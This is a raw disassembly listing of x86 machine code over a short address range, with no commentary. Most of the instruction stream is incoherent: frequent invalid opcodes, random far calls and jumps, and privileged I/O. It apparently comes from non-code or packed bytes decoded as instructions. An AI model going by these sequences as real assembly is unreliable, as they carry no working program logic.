  40ab80:	sub    ebp,0x74
  40ab83:	adc    al,0xd8
  40ab85:	mov    edx,0x1dfc38b4
  40ab8a:	mov    ecx,0x246bac60
  40ab8f:	fchs   
  40ab91:	(bad)  
  40ab92:	cs sbb al,0x3c
  40ab95:	dec    ebx
  40ab96:	jge    0x40abf1
  40ab98:	nop
  40ab99:	js     0x40ab1e
  40ab9b:	dec    ecx
  40ab9c:	mov    ebx,0xa15b1b6d
  40aba1:	cld    
  40aba2:	sbb    BYTE PTR [esi-0x38],ch
  40aba5:	pop    es
  40aba6:	xor    dh,dl
  40aba8:	dec    edx
  40aba9:	das    
  40abaa:	test   DWORD PTR [ebx+0x6c],ecx
  40abad:	pop    ebx
  40abae:	into   
  40abaf:	call   0x4384:0xfe22f229
  40abb6:	fiadd  DWORD PTR [ebp+0x749750b6]
  40abbc:	and    eax,ecx
  40abbe:	out    0x1f,al
  40abc0:	das    
  40abc1:	test   al,0x6d
  40abc3:	or     edx,DWORD PTR [edi]
  40abc5:	test   DWORD PTR [edi],esi
  40abc7:	xchg   edx,eax
  40abc8:	ror    BYTE PTR [eax+0x6df5e1bc],1
  40abce:	imul   esp,DWORD PTR [ecx+0x59],0x7685c453
  40abd5:	push   edi
  40abd6:	dec    ebp
  40abd7:	and    BYTE PTR [ebx],ah
  40abd9:	ins    DWORD PTR es:[edi],dx
  40abda:	pop    ebx
  40abdb:	fdiv   DWORD PTR [esi+0x1aecbf91]
  40abe1:	jg     0x40ab95
  40abe3:	push   esi
  40abe4:	push   esi
  40abe5:	add    DWORD PTR [edi-0x26],0x6d
  40abe9:	popa   
  40abea:	mov    eax,ds:0xa0988c1d
  40abef:	sbb    ebx,DWORD PTR [eax+0x7635dff4]
  40abf5:	fcmovnu st,st(0)
  40abf7:	push   ss
  40abf8:	icebp  
  40abf9:	xchg   ebx,eax
  40abfa:	aam    0x7c
  40abfc:	dec    esi
  40abfd:	stc    
  40abfe:	pop    ss
  40abff:	into   
  40ac00:	ins    DWORD PTR es:[edi],dx
  40ac01:	inc    edi
  40ac02:	fcmovnb st,st(2)
  40ac04:	test   DWORD PTR [ebp+0xeeb7117],esp
  40ac0a:	dec    eax
  40ac0b:	addr16 clc 
  40ac0d:	enter  0xdfec,0xd8
  40ac11:	dec    edx
  40ac12:	or     ecx,DWORD PTR [edi+0x5f]
  40ac15:	adc    al,0x29
  40ac17:	aas    
  40ac18:	(bad)  
  40ac19:	mov    eax,ds:0x1b910083
  40ac1e:	fcmovnbe st,st(6)
  40ac20:	xchg   esi,eax
  40ac21:	push   ss
  40ac22:	test   eax,0xea22f47
  40ac27:	test   DWORD PTR [ebp-0x720d121c],ecx
  40ac2d:	repnz cmp al,0x0
  40ac30:	pop    esi
  40ac31:	mov    dl,0x42
  40ac33:	cwde   
  40ac34:	jecxz  0x40ac36
  40ac36:	jmp    0x40ac30
  40ac38:	pop    edx
  40ac39:	pop    ss
  40ac3a:	inc    eax
  40ac3b:	fist   DWORD PTR [esi-0x6a38eb92]
  40ac41:	into   
  40ac42:	jb     0x40abee
  40ac44:	xchg   esi,eax
  40ac45:	dec    edx
  40ac46:	(bad)  
  40ac47:	(bad)  
  40ac48:	(bad)  
  40ac49:	mov    edx,0x7fa00d06
  40ac4e:	outs   dx,BYTE PTR ds:[esi]
  40ac4f:	into   
  40ac50:	popa   
  40ac51:	scas   al,BYTE PTR es:[edi]
  40ac52:	retf   0xe952
  40ac55:	ret    0x72d6
  40ac58:	mov    eax,0xb6a3d5b
  40ac5d:	jno    0x40aca6
  40ac5f:	mov    ch,0x85
  40ac61:	pop    ebx
  40ac62:	jmp    0xbf6a8489
  40ac67:	inc    esp
  40ac68:	mov    edx,0x7665bf16
  40ac6d:	test   eax,0xbabf2e01
  40ac72:	mov    cl,0x64
  40ac74:	cld    
  40ac75:	outs   dx,BYTE PTR ds:[esi]
  40ac76:	stos   DWORD PTR es:[edi],eax
  40ac77:	sbb    bh,BYTE PTR [ebx]
  40ac79:	aaa    
  40ac7a:	mov    dh,0x6d
  40ac7c:	sbb    DWORD PTR [edx+0x7b],0x84b0f5b9
  40ac83:	fdivr  DWORD PTR [ebx+ebp*1+0x4b6db1b1]
  40ac8a:	mov    esp,0x7769e320
  40ac8f:	xor    bh,cl
  40ac91:	push   edx
  40ac92:	jbe    0x40ac3d
  40ac94:	jo     0x40ac39
  40ac96:	imul   ebx,DWORD PTR [eax+esi*8-0xc0a623f],0x16dafecc
  40aca1:	retf   0xfbd6
  40aca4:	cmp    dh,BYTE PTR [ebp-0x5764215a]
  40acaa:	push   0xaa5a3637
  40acaf:	(bad)  
  40acb0:	call   0xe8910a47
  40acb5:	outs   dx,BYTE PTR ds:[esi]
  40acb6:	ins    BYTE PTR es:[edi],dx
  40acb7:	ins    DWORD PTR es:[edi],dx
  40acb8:	sub    DWORD PTR [eax-0x24],ebx
  40acbb:	loop   0x40ad17
  40acbd:	test   BYTE PTR [eax+ecx*1-0x2934b8f5],0x2e
  40acc5:	pop    es
  40acc6:	sub    BYTE PTR [esi],0x8f
  40acc9:	mov    bl,0x97
  40accb:	mov    es,ecx
  40accd:	fcmovu st,st(0)
  40accf:	fimul  DWORD PTR ds:0x29ce1fa5
  40acd5:	xor    eax,0x638766af
  40acda:	arpl   bx,bx
  40acdc:	pop    eax
  40acdd:	lds    esp,FWORD PTR [edi-0x36465b52]
  40ace3:	xor    ebp,edx
  40ace5:	leave  
  40ace6:	aaa    
  40ace7:	fidiv  DWORD PTR [esi+0x69]
  40acea:	mov    ecx,0x776b81aa
  40acef:	daa    
  40acf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf1:	cmp    DWORD PTR [ecx],ecx
  40acf3:	test   al,0x97
  40acf5:	push   ss
  40acf6:	push   ss
  40acf7:	or     ah,BYTE PTR [ebx+esi*2-0x3a]
  40acfb:	add    DWORD PTR [edx],ebx
  40acfd:	jge    0x40ad68
  40acff:	sbb    al,0x6b
  40ad01:	mov    ds:0xdb2f2c6d,eax
  40ad06:	sahf   
  40ad07:	repnz nop
  40ad09:	int    0xa0
  40ad0b:	aaa    
  40ad0c:	pop    edx
  40ad0d:	fld    TBYTE PTR [ebp+0x16]
  40ad10:	ret    0x99ee
  40ad13:	sub    al,0x8e
  40ad15:	pop    ebx
  40ad16:	and    al,0x6d
  40ad18:	inc    esp
  40ad19:	fild   DWORD PTR [edx-0x7]
  40ad1c:	push   ss
  40ad1d:	in     al,0xb9
  40ad1f:	add    BYTE PTR [edx+eiz*2],bh
  40ad22:	pop    esi
  40ad23:	mov    al,BYTE PTR [eax+0x1e00d6f3]
  40ad29:	outs   dx,BYTE PTR ds:[esi]
  40ad2a:	ficom  DWORD PTR ds:0xd7135e79
  40ad30:	push   cs
  40ad31:	pop    ebx
  40ad32:	(bad)  [esi+0x71a46fed]
  40ad38:	test   DWORD PTR [ecx-0x433c6dec],ecx
  40ad3e:	loopne 0x40ad78
  40ad40:	or     BYTE PTR [esi-0x14a4f473],dl
  40ad46:	fadd   DWORD PTR [edx-0x5b]
  40ad49:	or     dh,BYTE PTR [esi+0x61d0be51]
  40ad4f:	in     eax,0x36
  40ad51:	add    BYTE PTR [ebx-0x6aae092f],al
  40ad57:	mov    dh,0x8d
  40ad59:	dec    ebx
  40ad5a:	in     eax,dx
  40ad5b:	pop    ss
  40ad5c:	inc    esi
  40ad5d:	xlat   BYTE PTR ds:[ebx]
  40ad5e:	adc    cl,0xe4
  40ad61:	pushf  
  40ad62:	scas   eax,DWORD PTR es:[edi]
  40ad63:	sbb    al,BYTE PTR [esi+0x36d0b1bb]
  40ad69:	dec    ebx
  40ad6a:	jno    0x40ad3a
  40ad6c:	dec    ecx
  40ad6d:	jbe    0x40ad8d
  40ad6f:	das    
  40ad70:	ret    0xdba1
  40ad73:	mov    dh,0xa7
  40ad75:	pop    ebx
  40ad76:	sub    al,0xbd
  40ad78:	dec    esp
  40ad79:	out    0x8d,al
  40ad7b:	and    ecx,DWORD PTR [esi+0x760843fe]
  40ad81:	sub    DWORD PTR [ebp+0x63],0x4d734512
  40ad88:	cdq    
  40ad89:	xor    BYTE PTR [ebx],dh
  40ad8b:	sub    eax,0xdad858b9
  40ad90:	test   DWORD PTR [edx],edi
  40ad92:	or     al,ah
  40ad94:	pop    edi
  40ad95:	inc    esp
  40ad96:	retf   0xe434
  40ad99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad9a:	jb     0x40adff
  40ad9c:	fild   DWORD PTR [edx-0x46]
  40ad9f:	aam    0x1c
  40ada1:	sub    eax,0x6ef5fd4a
  40ada6:	sbb    edx,DWORD PTR [edx+ecx*2]
  40ada9:	imul   esi,DWORD PTR [ebx-0x50],0x9f1629b5
  40adb0:	adc    al,0x6e
  40adb2:	xor    al,0x16
  40adb4:	fs aaa 
  40adb6:	adc    DWORD PTR [ecx-0x75],0xb4b10ad3
  40adbd:	adc    eax,0x8b79b52e
  40adc2:	fdiv   QWORD PTR [ecx-0xe]
  40adc5:	xor    eax,0xc2c6c661
  40adca:	mov    dh,0xd8
  40adcc:	(bad)  
  40adcd:	pop    ss
  40adce:	mov    ah,0x73
  40add0:	sar    BYTE PTR [edi],1
  40add2:	mov    dh,0x24
  40add4:	jnp    0x40adbe
  40add6:	ret    0x4dc2
  40add9:	test   eax,0x18ae6afb
  40adde:	mov    DWORD PTR [ecx],ebx
  40ade0:	pop    ss
  40ade1:	ret    0xb5b6
  40ade4:	inc    edx
  40ade5:	aad    0xe3
  40ade7:	sub    al,0xd9
  40ade9:	add    eax,0x7b7fd622
  40adee:	call   0xccebdb5
  40adf3:	scas   al,BYTE PTR es:[edi]
  40adf4:	repnz inc ebx
  40adf6:	sti    
  40adf7:	lahf   
  40adf8:	jg     0x40adfa
  40adfa:	inc    edx
  40adfb:	arpl   WORD PTR [eax],ax
  40adfd:	mov    dh,0x54
  40adff:	add    BYTE PTR [esi-0x7c8a69e1],dl
  40ae05:	fs sti 
  40ae07:	sbb    ecx,DWORD PTR [ebp-0x6c1112a5]
  40ae0d:	sub    al,0x67
  40ae0f:	cmp    dh,bl
  40ae11:	out    0x66,eax
  40ae13:	and    ebx,ebp
  40ae15:	sbb    cl,BYTE PTR ds:0x5e5d525b
  40ae1b:	pop    ss
  40ae1c:	loope  0x40ae1c
  40ae1e:	xchg   edx,eax
  40ae1f:	fdiv   QWORD PTR [esi+0x61]
  40ae22:	stos   DWORD PTR es:[edi],eax
  40ae23:	mov    al,0x86
  40ae25:	sbb    DWORD PTR [ebx+edi*4+0x60],ecx
  40ae29:	out    dx,al
  40ae2a:	scas   eax,DWORD PTR es:[edi]
  40ae2b:	jmp    0x40adc8
  40ae2d:	pop    ebx
  40ae2e:	dec    ebp
  40ae2f:	shr    BYTE PTR [ebp+0x43a840b2],0xeb
  40ae36:	push   ss
  40ae37:	neg    ebx
  40ae39:	(bad)  
  40ae3a:	mov    BYTE PTR [edx],0x33
  40ae3d:	(bad)  
  40ae3e:	stc    
  40ae3f:	ret    
  40ae40:	push   edx
  40ae41:	aaa    
  40ae42:	into   
  40ae43:	call   0xf00a:0xb40a176
  40ae4a:	enter  0x3f82,0x16
  40ae4e:	cmc    
  40ae4f:	jbe    0x40aeb2
  40ae51:	imul   ebx,ebx,0x2e
  40ae54:	push   cs
  40ae55:	data16 mov bl,0x41
  40ae58:	div    cl
  40ae5a:	mov    BYTE PTR [edi+0x74],0xda
  40ae5e:	fdiv   DWORD PTR [esi-0x6a84b67b]
  40ae64:	sub    eax,0xe951d4aa
  40ae69:	pop    eax
  40ae6a:	pop    edx
  40ae6b:	pop    eax
  40ae6c:	fsub   DWORD PTR [ecx+0x7f]
  40ae6f:	jl     0x40ae52
  40ae71:	sbb    al,0xde
  40ae73:	add    ch,BYTE PTR [ecx-0x13]
  40ae76:	rcl    BYTE PTR [edx-0x57],cl
  40ae79:	and    ah,bl
  40ae7b:	xor    DWORD PTR [edx-0x4e5513e3],ebp
  40ae81:	sub    eax,0xe5026c6c
  40ae86:	mov    cl,0x7f
  40ae89:	in     eax,dx
  40ae8a:	inc    ecx
  40ae8b:	jmp    0xb1f68033
  40ae90:	stos   DWORD PTR es:[edi],eax
  40ae91:	cmc    
  40ae92:	cld    
  40ae93:	icebp  
  40ae94:	xchg   esp,eax
  40ae95:	push   es
  40ae96:	(bad)  
  40ae97:	or     DWORD PTR [eax],eax
  40ae99:	or     dh,BYTE PTR [edi-0x3e3c3a93]
  40ae9f:	mov    esp,0xcb2535cd
  40aea4:	(bad)  
  40aea5:	push   esi
  40aea6:	pop    eax
  40aea7:	outs   dx,DWORD PTR ds:[esi]
  40aea8:	xor    ebx,DWORD PTR [esi-0x8]
  40aeab:	fst    QWORD PTR [ecx-0x21]
  40aeae:	jbe    0x40af11
  40aeb0:	test   eax,0xbf4f5b45
  40aeb5:	or     BYTE PTR [ebp-0x38127149],ch
  40aebb:	lea    esi,[esi-0x55]
  40aebe:	push   esp
  40aebf:	fwait
  40aec0:	or     al,0xa3
  40aec2:	pop    ebp
  40aec3:	pushf  
  40aec4:	push   esi
  40aec5:	call   0x7d14:0x7c2e1541
  40aecc:	loop   0x40aeaa
  40aece:	sbb    ecx,DWORD PTR [edx-0x4726a4f3]
  40aed4:	mov    ah,0x6b
  40aed6:	sub    DWORD PTR [edx+0x7ac37ef4],edx
  40aedc:	shl    DWORD PTR [ecx+0x54],1
  40aedf:	mov    eax,0x63b6c6d
  40aee4:	pushf  
  40aee5:	fiadd  DWORD PTR [edi+ebx*1-0x79]
  40aee9:	xor    ecx,eax
  40aeeb:	(bad)  
  40aeec:	mov    edx,0x796805b0
  40aef1:	sar    BYTE PTR [ebx+0x17541746],0x96
  40aef8:	push   ss
  40aef9:	sbb    cl,BYTE PTR [eax+0x468fbd3d]
  40aeff:	mov    al,ds:0x5850428a
  40af04:	pop    edx
  40af05:	push   0xeff801e3
  40af0a:	cmp    bl,ah
  40af0c:	ins    DWORD PTR es:[edi],dx
  40af0d:	loope  0x40aee5
  40af0f:	test   al,0xcc
  40af11:	dec    esp
  40af12:	adc    DWORD PTR [edx+ebp*1+0x6d5026c4],ebp
  40af19:	mov    eax,ds:0x38ae1b55
  40af1e:	cli    
  40af1f:	mov    ds:0x342ce301,eax
  40af24:	(bad)
  40af27:	adc    dh,BYTE PTR [edx-0x5cea2ff2]
  40af2d:	pushf  
  40af2e:	ins    DWORD PTR es:[edi],dx
  40af2f:	mov    ebx,0x7a26ed1
  40af34:	out    dx,al
  40af35:	push   0xf5d0ff75
  40af3a:	inc    eax
  40af3b:	shl    DWORD PTR [eax-0x29492e50],1
  40af41:	in     al,dx
  40af42:	jl     0x40afb8
  40af44:	fmul   DWORD PTR [edx+0x67]
  40af47:	jge    0x40af26
  40af49:	ficomp DWORD PTR [edx]
  40af4b:	sbb    esi,DWORD PTR [edx+0x58]
  40af4e:	dec    eax
  40af4f:	sahf   
  40af50:	stc    
  40af51:	les    esp,FWORD PTR [edx]
  40af53:	dec    esp
  40af54:	ins    DWORD PTR es:[edi],dx
  40af55:	fcmovnu st,st(2)
  40af57:	mov    dh,0x41
  40af59:	dec    eax
  40af5a:	sub    DWORD PTR [ebx+edx*2+0x23],eax
  40af5e:	add    eax,0xad899ed4
  40af63:	test   DWORD PTR [ebp-0x6f4b9673],esp
  40af69:	push   cs
  40af6a:	arpl   WORD PTR [ecx],bx
  40af6c:	mov    ecx,DWORD PTR [edx]
  40af6e:	pop    ss
  40af6f:	ss push ss
  40af71:	fisubr DWORD PTR [edi+0x24]
  40af74:	inc    edi
  40af75:	cs jns 0x40af1d
  40af78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af79:	mov    ebx,0x5ae01414
  40af7e:	pop    edx
  40af7f:	push   0xe1007c8
  40af84:	mov    cl,0xa0
  40af86:	push   0x17
  40af88:	pop    edx
  40af89:	mov    eax,ds:0xe505fc5e
  40af8e:	dec    ebp
  40af8f:	clc    
  40af90:	cmc    
  40af91:	mov    al,ds:0xacda850b
  40af96:	inc    edi
  40af97:	shr    DWORD PTR [ebx],0x5a
  40af9a:	call   0x1a4e6655
  40af9f:	sti    
  40afa0:	push   ebx
  40afa1:	sub    DWORD PTR [edx],eax
  40afa3:	sub    DWORD PTR ds:0xdadab69d,esi
  40afa9:	push   ss
  40afaa:	push   ss
  40afab:	sbb    al,0x72
  40afad:	or     bh,BYTE PTR [esp+edi*4+0x716219e3]
  40afb4:	imul   ebp,DWORD PTR [ebx],0x3b92565c
  40afba:	jo     0x40af7e
  40afbc:	fnsave [edx]
  40afbe:	rcr    BYTE PTR [ecx+0x6d],cl
  40afc1:	mov    ebx,0xb2ac4db5
  40afc6:	inc    ebx
  40afc7:	imul   ebp,DWORD PTR [ecx],0xffffffce
  40afca:	sbb    DWORD PTR [edx],ebx
  40afcc:	lods   eax,DWORD PTR ds:[esi]
  40afcd:	mov    WORD PTR [edi+ebx*8+0x67f2b6],ss
  40afd4:	daa    
  40afd5:	addr16 fwait
  40afd7:	cli    
  40afd8:	(bad)  
  40afd9:	xchg   edx,eax
  40afda:	and    DWORD PTR [eax],eax
  40afdc:	int3   
  40afdd:	cld    
  40afde:	mov    cl,0xd0
  40afe0:	outs   dx,BYTE PTR ds:[esi]
  40afe1:	sub    al,0xc7
  40afe3:	std    
  40afe4:	cld    
  40afe5:	aam    0xd2
  40afe7:	xlat   BYTE PTR ds:[ebx]
  40afe8:	adc    edi,DWORD PTR [edx-0x4e8a5c97]
  40afee:	pop    ebp
  40afef:	xchg   DWORD PTR [ecx+0x61],edx
  40aff2:	in     al,dx
  40aff3:	or     al,0xd0
  40aff5:	mov    ecx,0x6b70be51
  40affa:	fisubr DWORD PTR [ecx-0x7083dcf7]
  40b000:	add    ch,al
  40b002:	arpl   WORD PTR [ebx-0x25],bx
  40b005:	(bad)  
  40b006:	mov    dh,0xae
  40b008:	push   edx
  40b009:	mov    WORD PTR [edx+0x61],?
  40b00c:	push   cs
  40b00d:	pop    ss
  40b00e:	movaps xmm4,XMMWORD PTR [ebx]
  40b011:	xor    al,0x6e
  40b013:	sub    al,0xb5
  40b015:	push   ebp
  40b016:	push   cs
  40b017:	pop    ss
  40b018:	xor    BYTE PTR ds:[ebp+edi*1+0x4e],dl
  40b01d:	mov    al,0xb4
  40b01f:	mov    ch,0x1b
  40b021:	sti    
  40b022:	and    ax,0x1a80
  40b026:	sahf   
  40b027:	mov    DWORD PTR [ecx-0x4a],eax
  40b02a:	mov    ah,0x41
  40b02c:	sub    al,0x63
  40b02e:	xor    ah,bh
  40b030:	cli    
  40b031:	mov    al,0xf3
  40b033:	(bad)  
  40b034:	pop    ebx
  40b035:	push   0x6dba8db7
  40b03a:	cmp    DWORD PTR [esi],0xfffffff2
  40b03d:	sbb    eax,0x96203f7f
  40b042:	fisubr DWORD PTR [ebp+0x61]
  40b045:	jae    0x40afe1
  40b047:	xor    DWORD PTR [edi-0x25],0x8d8ce613
  40b04e:	in     eax,dx
  40b04f:	add    BYTE PTR [ebp-0x24],ch
  40b052:	fiadd  DWORD PTR [esi-0x6d733f9b]
  40b058:	push   cs
  40b059:	pop    ebx
  40b05a:	or     dh,BYTE PTR [esi-0x2907414a]
  40b060:	lods   al,BYTE PTR ds:[esi]
  40b061:	mov    ?,WORD PTR [eax]
  40b063:	adc    eax,0x6c2c4bad
  40b068:	ins    DWORD PTR es:[edi],dx
  40b069:	leave  
  40b06a:	imul   edi,DWORD PTR [edi+0x40057c79],0x8
  40b071:	mov    dh,0xb6
  40b074:	ins    DWORD PTR es:[edi],dx
  40b075:	sbb    eax,0xe3a1bf78
  40b07a:	sub    al,BYTE PTR [eax+ecx*4+0x46d53451]
  40b081:	mov    edx,DWORD PTR [edi]
  40b083:	ss inc eax
  40b085:	xchg   ebp,eax
  40b086:	aaa    
  40b087:	sbb    ecx,DWORD PTR [ebx]
  40b089:	dec    ebx
  40b08a:	ins    BYTE PTR es:[edi],dx
  40b08b:	in     eax,dx
  40b08c:	repz xor al,0x1e
  40b08f:	loop   0x40b064
  40b091:	mov    ebp,0x6dadd27c
  40b096:	and    BYTE PTR [ebp+0x2f],0xde
  40b09a:	lock sar DWORD PTR [edx-0x2],1
  40b09e:	dec    ebp
  40b09f:	adc    DWORD PTR [ebp-0x72295a5b],esp
  40b0a5:	test   edx,esi
  40b0a7:	lock xchg edx,eax
  40b0a9:	cdq    
  40b0aa:	mov    al,0xdc
  40b0ac:	push   0x20929697
  40b0b1:	adc    al,0x7f
  40b0b3:	retf   0x1265
  40b0b6:	and    bh,BYTE PTR [edx+0x515d016d]
  40b0bc:	scas   eax,DWORD PTR es:[edi]
  40b0bd:	cmp    eax,0xdadbb62a
  40b0c2:	jbe    0x40b067
  40b0c4:	inc    ebp
  40b0c5:	inc    ebp
  40b0c6:	stos   DWORD PTR es:[edi],eax
  40b0c7:	dec    edi
  40b0c8:	(bad)  
  40b0c9:	int    0xf5
  40b0cb:	and    BYTE PTR [ebp-0x4e4344fe],bl
  40b0d1:	jo     0x40b061
  40b0d3:	pop    edi
  40b0d4:	int    0x5b
  40b0d6:	test   al,0x57
  40b0d8:	add    BYTE PTR [esi+0x4bb377cf],bl
  40b0de:	fcmovnb st,st(2)
  40b0e0:	inc    edx
  40b0e1:	mov    edi,eax
  40b0e3:	and    bh,bh
  40b0e5:	repnz icebp 
  40b0e7:	and    esp,ecx
  40b0e9:	pop    ebx
  40b0ea:	ins    DWORD PTR es:[edi],dx
  40b0eb:	mov    ebx,0xbea5f6d
  40b0f0:	(bad)
  40b0f4:	sti    
  40b0f5:	cmp    bh,BYTE PTR [esi-0x25]
  40b0f8:	mov    dh,0x35
  40b0fa:	mov    dh,0xdd
  40b0fc:	out    0x97,al
  40b0fe:	js     0x40b132
  40b100:	push   0xffffffb9
  40b102:	outs   dx,BYTE PTR ds:[esi]
  40b103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b104:	bound  ebp,QWORD PTR [ecx-0x7a4a91d7]
  40b10a:	fisubr DWORD PTR [ebx]
  40b10c:	pop    edx
  40b10d:	mov    ds:0x851752cd,al
  40b112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b114:	jbe    0x40b16c
  40b116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b117:	repnz bound ecx,QWORD PTR [esi-0xe]
  40b11b:	inc    edx
  40b11c:	dec    edi
  40b11d:	imul   edi,ecx,0x9468df2
  40b123:	cmp    al,dh
  40b125:	add    BYTE PTR [esi],bh
  40b127:	xor    cl,bh
  40b129:	add    BYTE PTR [esi],dh
  40b12b:	sub    ah,dh
  40b12d:	in     eax,dx
  40b12e:	and    BYTE PTR [ecx-0x7c3ad18a],0x6b
  40b135:	sbb    al,0x1a
  40b137:	jmp    0x310b:0xb42c2cb9
  40b13e:	adc    ah,bl
  40b140:	mov    dh,0x52
  40b142:	or     dl,bl
  40b144:	push   cs
  40b145:	xchg   ebp,eax
  40b146:	gs mov ebx,0xe02d56d
  40b14c:	push   es
  40b14d:	add    edi,DWORD PTR [edi-0x4924f6f2]
  40b153:	shr    DWORD PTR [esi],1
  40b155:	adc    al,0xf6
  40b157:	pop    ds
  40b158:	je     0x40b160
  40b15a:	out    dx,eax
  40b15b:	cmp    cl,0xb0
  40b15e:	stc    
  40b15f:	mov    ebx,0xfb46c6d
  40b164:	into   
  40b165:	cdq    
  40b166:	mov    ebx,0x5ca1146f
  40b16b:	dec    eax
  40b16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16d:	fimul  DWORD PTR ds:0x8c4c6d13
  40b173:	les    eax,FWORD PTR [edx-0x32]
  40b176:	cmp    eax,esp
  40b178:	pop    ds
  40b179:	fsubr  QWORD PTR [edx-0x49]
  40b17c:	loop   0x40b136
  40b17e:	sub    edx,esp
  40b180:	shl    DWORD PTR [edx+0x6cabf837],cl
  40b186:	in     eax,dx
  40b187:	mov    dh,0x6c
  40b189:	mov    edi,0xdcb3a4ab
  40b18e:	fcmovbe st,st(4)
  40b190:	ja     0x40b127
  40b192:	lods   eax,DWORD PTR ds:[esi]
  40b193:	add    ebx,edx
  40b195:	rcl    BYTE PTR cs:[esi+0x10cadace],1
  40b19c:	xchg   DWORD PTR [edi-0x7269a01b],edi
  40b1a2:	call   0x32:0x716578cf
  40b1a9:	pusha  
  40b1aa:	add    BYTE PTR cs:[edx-0x6a],ch
  40b1ae:	gs pop ecx
  40b1b0:	xchg   esi,eax
  40b1b1:	jnp    0x40b216
  40b1b3:	jbe    0x40b1f9
  40b1b5:	dec    edi
  40b1b6:	dec    ebp
  40b1b7:	pop    ebx
  40b1b8:	and    BYTE PTR [ebp+0x59],0x78
  40b1bc:	push   esi
  40b1bd:	popa   
  40b1be:	rol    BYTE PTR [edx],1
  40b1c0:	and    BYTE PTR [ebp+0x2f52cb8d],dh
  40b1c6:	and    BYTE PTR [esi+esi*2],dl
  40b1c9:	(bad)  
  40b1ca:	jb     0x40b179
  40b1cc:	jbe    0x40b18e
  40b1ce:	ret    0x1212
  40b1d1:	push   0xffffff8b
  40b1d3:	add    ax,WORD PTR [ecx]
  40b1d6:	pop    esi
  40b1d7:	mov    dl,0x54
  40b1d9:	fcom   DWORD PTR [esi+0x56da5ace]
  40b1df:	popf   
  40b1e0:	das    
  40b1e1:	xor    ebp,DWORD PTR [edi]
  40b1e3:	xchg   esp,eax
  40b1e4:	or     bl,0x1e
  40b1e7:	sub    al,0x46
  40b1e9:	lea    esp,[ecx-0x42]
  40b1ec:	add    al,ch
  40b1ee:	fsubr  DWORD PTR [esi+0x2c]
  40b1f1:	sub    al,0xdf
  40b1f3:	pop    ebx
  40b1f4:	loope  0x40b211
  40b1f6:	retf   
  40b1f7:	scas   al,BYTE PTR es:[edi]
  40b1f8:	retf   
  40b1f9:	stos   BYTE PTR es:[edi],al
  40b1fa:	or     ebx,DWORD PTR ds:0xf369a1b0
  40b200:	mov    ah,0x5a
  40b202:	sub    al,0x31
  40b204:	sbb    al,0x74
  40b206:	test   eax,0x969880ed
  40b20b:	add    edi,DWORD PTR [edi]
  40b20d:	adc    al,0x6b
  40b20f:	pop    ds
  40b210:	mov    bh,0xcb
  40b212:	jmp    DWORD PTR [ebp-0x5f]
  40b215:	retf   
  40b216:	jg     0x40b241
  40b218:	mov    dh,0x4b
  40b21a:	add    BYTE PTR [edx+0x47],dl
  40b21d:	add    BYTE PTR [edi-0x5fa4ffbd],bh
  40b223:	ins    DWORD PTR es:[edi],dx
  40b224:	loope  0x40b1d8
  40b226:	ins    BYTE PTR es:[edi],dx
  40b227:	mov    edi,0x6f4da944
  40b22c:	mov    ch,0x6b
  40b22e:	xchg   ebp,eax
  40b22f:	ret    0x2cb2
  40b232:	or     edi,DWORD PTR [edi-0x65]
  40b235:	jg     0x40b1c3
  40b237:	push   0x4b2cb291
  40b23c:	in     eax,dx
  40b23d:	test   DWORD PTR [ebx-0x6b],esi
  40b240:	mov    bl,0x7e
  40b242:	call   0x93ed:0xb7cb0a77
  40b249:	lahf   
  40b24a:	adc    al,0x9b
  40b24c:	sbb    dl,BYTE PTR [edi-0x506c9f00]
  40b252:	jg     0x40b228
  40b254:	pop    edx
  40b255:	mov    BYTE PTR [esi],dl
  40b257:	jns    0x40b217
  40b259:	and    ah,BYTE PTR [ebx-0x347af4f9]
  40b25f:	mov    dh,0xcb
  40b261:	push   esp
  40b262:	pop    edi
  40b263:	mov    al,0x5d
  40b265:	mov    bl,0x16
  40b267:	jbe    0x40b28f
  40b269:	ins    BYTE PTR es:[edi],dx
  40b26a:	mov    ah,0x8d
  40b26c:	pop    ebx
  40b26d:	ins    DWORD PTR es:[edi],dx
  40b26e:	ret    0xc9c7
  40b271:	ret    
  40b272:	(bad)  
  40b273:	cdq    
  40b274:	xor    BYTE PTR [ebx-0x5b],bl
  40b277:	or     ebp,DWORD PTR [edi+edi*8-0x2c]
  40b27b:	xchg   DWORD PTR [ecx],edi
  40b27d:	rcl    DWORD PTR [edi+ecx*2],cl
  40b280:	add    cl,bl
  40b282:	mov    dl,0x6c
  40b284:	or     esi,DWORD PTR [ebx-0x28]
  40b287:	mov    edi,0xf81cef0b
  40b28c:	sub    al,0xcb
  40b28e:	mov    dl,0x2c
  40b290:	adc    eax,0xdc0aeef1
  40b295:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b297:	retf   
  40b298:	mov    dl,0x78
  40b29a:	lds    esp,FWORD PTR [ecx-0x5a]
  40b29d:	xor    ah,BYTE PTR [edx+0x659e6a00]
  40b2a3:	pop    ecx
  40b2a4:	xchg   esi,eax
  40b2a5:	lods   eax,DWORD PTR ds:[esi]
  40b2a6:	dec    edi
  40b2a7:	push   ebx
  40b2a8:	clc    
  40b2a9:	pop    esp
  40b2aa:	loope  0x40b286
  40b2ac:	push   0xea45970b
  40b2b1:	and    ch,0xfe
  40b2b4:	xchg   ah,ah
  40b2b6:	aaa    
  40b2b7:	lds    esi,FWORD PTR [esi-0x57]
  40b2ba:	pop    ebp
  40b2bb:	clc    
  40b2bc:	xchg   esp,eax
  40b2bd:	repnz pop esp
  40b2bf:	sti    
  40b2c0:	(bad)  
  40b2c1:	jmp    0x76d0:0xb2cbe6d1
  40b2c8:	push   esp
  40b2c9:	and    bl,dh
  40b2cb:	sar    DWORD PTR [edi+0x1b],1
  40b2ce:	mov    al,0x14
  40b2d0:	sub    al,0xcb
  40b2d2:	mov    dl,0x2c
  40b2d4:	test   eax,0x5b06a20d
  40b2d9:	mov    dl,0x2c
  40b2db:	retf   
  40b2dc:	mov    dl,0xff
  40b2de:	dec    esp
  40b2df:	call   0x4bcea439
  40b2e4:	or     ecx,ebx
  40b2e6:	pop    esi
